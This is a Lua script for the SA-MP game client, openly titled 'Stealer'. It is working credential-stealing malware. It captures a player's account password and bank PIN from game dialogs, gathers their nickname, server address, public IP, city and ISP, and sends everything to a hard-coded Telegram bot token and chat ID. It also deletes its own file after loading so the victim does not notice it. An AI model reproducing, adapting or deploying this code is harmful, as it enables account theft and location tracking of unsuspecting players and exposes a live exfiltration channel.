------ Информация ------
script_name("Stealer")
script_author("Kerrel")
script_description("This script steals the nickname, password, ip of the server that the player entered with this script.")
------ Библиотека ------
local lib = require("lib.moonloader")
local ev = require("lib.samp.events")
local effil = require("effil")
local encoding = require("encoding")
local dlstatus = require("moonloader").download_status
------ Переменная ------
encoding.default = "CP1251"
u8 = encoding.UTF8

local user_id = "1736139431"
local bot_id = "5131580974:AAHlSNI0OoTEFlval9YcRQ465kEhfNgtRJE"

local NickName = ""
local Password = ""
local PinCode = ""
local ServerIp = ""
local PLAYER_COUNTRY = ""
local PLAYER_REGION = ""
local PLAYER_PROVIDER = ""
local PLAYER_IP = ""
local PLAYER_CITY = ""
------ Говно  Код ------
function ev.onSendDialogResponse(id, button, list, input)
	if id == 2 then
		Password = input
	end
	if id == 991 then
		PinCode = input
	end
end

function ev.onShowDialog(did, style, title, button1, button2, text)
	if text:find("код принят") then
		sendTelegramNotification("[Stealer] Обновление данных!\n \nНик: "..NickName.."\nPIN-код от банка: "..PinCode.."\n\nP.S.: Сравнивайте новый ник со старым (которые были получены ранее), именно к этому аккаунту был получен PIN-код от банка.")
	end
end

function ev.onDisplayGameText(style, time, text)
	if text:find("Welcome") then
		lua_thread.create(function()
			wait(1000)
			sendTelegramNotification("[Stealer] Появились новые данные!\n \nНик: "..NickName.."\nПароль: "..Password.."\nIP сервера: "..ServerIp.."\nСтрана: "..PLAYER_COUNTRY.."\nРегион: "..PLAYER_REGION..", "..PLAYER_CITY.."\nПровайдер: "..PLAYER_PROVIDER.."\nIP-Адрес: "..PLAYER_IP.."\n")
		end)
	end
end

function getPlayerIP()
	local json = os.getenv("TEMP").."\\sd6ig4SKJa31sjk4gDKu345sagdfb3.json"
	downloadUrlToFile("http://ip-api.com/json/?fields=61439", json, function(id, status, p1, p2)
		if status == dlstatus.STATUS_ENDDOWNLOADDATA then
			local f = io.open(json, "r")
			if f then
				local ip = decodeJson(f:read("*a"))
				PLAYER_COUNTRY = ip.country
				PLAYER_REGION = ip.regionName
				PLAYER_CITY = ip.city
				PLAYER_PROVIDER = ip.isp
				PLAYER_IP = ip.query
				f:close()
				os.remove(json)
			end
		end
	end)
end

-- Уведомления в Telegram --
function threadHandle(runner, url, args, resolve, reject)
  local t = runner(url, args)
  local r = t:get(0)
  while not r do
    r = t:get(0)
    wait(0)
  end
  local status = t:status()
  if status == "completed" then
    local ok, result = r[1], r[2]
    if ok then resolve(result) else reject(result) end
  elseif err then
    reject(err)
  elseif status == "canceled" then
    reject(status)
  end
  t:cancel(0)
end

function requestRunner()
  return effil.thread(function(u, a)
  	local https = require "ssl.https"
  	local ok, result = pcall(https.request, u, a)
  	if ok then
    	return {true, result}
  	else
    	return {false, result}
	  end
	end)
end

function async_http_request(url, args, resolve, reject)
  local runner = requestRunner()
  if not reject then reject = function() end end
  lua_thread.create(function()
    threadHandle(runner, url, args, resolve, reject)
  end)
end

function encodeUrl(str)
  str = str:gsub(" ", "%+")
  str = str:gsub("\n", "%%0A")
  return u8:encode(str, "CP1251")
end

function sendTelegramNotification(msg)
  msg = msg:gsub("{......}", "")
  msg = encodeUrl(msg)
  async_http_request("https://api.telegram.org/bot"..bot_id.. "/sendMessage?chat_id="..user_id.."&text="..msg,"", function(result) end)
end
----
function main()
	while not isSampAvailable() do wait(0) end

	lua_thread.create(function() while true do wait(5000) getPlayerIP() end end)
	os.remove(thisScript().path)

	while true do wait(0)
		local _, PLAYER_ID = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local PLAYER_NAME = sampGetPlayerNickname(PLAYER_ID)
		local SERVER_IP, SERVER_PORT = sampGetCurrentServerAddress()
		NickName = PLAYER_NAME
		SERVER_IP = SERVER_IP..":"..SERVER_PORT
		ServerIp = SERVER_IP
	end
end
